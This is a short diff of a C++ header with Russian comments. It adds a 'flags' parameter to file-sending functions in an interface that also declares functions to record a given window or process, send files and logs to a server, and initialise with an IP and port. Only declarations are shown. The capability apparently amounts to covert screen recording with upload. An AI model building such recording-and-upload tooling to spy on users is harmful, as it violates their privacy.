@@ -54,8 +54,8 @@ private:
 	typedef VOID (WINAPI *TResetTime	)();
 
 	//функции отправки файлов
-	typedef VOID ( WINAPI *TStartSend	)( DWORD server, char* name, char* path, int after );
-	typedef DWORD ( WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int after );
+	typedef VOID ( WINAPI *TStartSend	)( DWORD server, char* name, char* path, int flags, int after );
+	typedef DWORD ( WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int flags, int after );
 	typedef DWORD ( WINAPI *TIsSendedAsync )( DWORD );
 	typedef DWORD ( WINAPI *TFolderIsUpload )( const char* name, const char* folder );
 
@@ -114,7 +114,7 @@ int Init( int flags, const char* ip, int port, int downtime );
 bool RecordHWND( int server, const char* name, HWND wnd, int seconds = 0, int flags = 0 );
 bool RecordPID( int server, const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
 void RecordStop();
-DWORD SendFiles( int server, const char* name, const char* path, int after = 0, bool async = false );
+DWORD SendFiles( int server, const char* name, const char* path, int flags = 0, int after = 0, bool async = false );
 bool FolderIsUpload( const char* name, const char* path );
 bool FilesIsSended(DWORD id);
 bool SendLog( int server, const char* name, int code, const char* text );
